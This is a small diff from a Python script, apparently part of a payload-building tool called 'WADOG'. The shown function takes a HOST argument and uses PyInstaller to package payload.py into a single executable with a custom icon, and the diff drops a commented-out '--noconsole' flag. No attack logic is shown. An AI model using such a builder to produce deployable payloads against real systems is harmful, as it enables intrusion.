@@ -63,7 +63,6 @@ def Payload_initializer(HOST):
     SMM_Spinner.info('[$WADOG:INFO]:=> building Paylod')         
     PyInstaller.__main__.run([
     '--onefile',
-    # '--noconsole',
     '--icon=wadog.ico',
     os.path.join('payload.py')
     ])
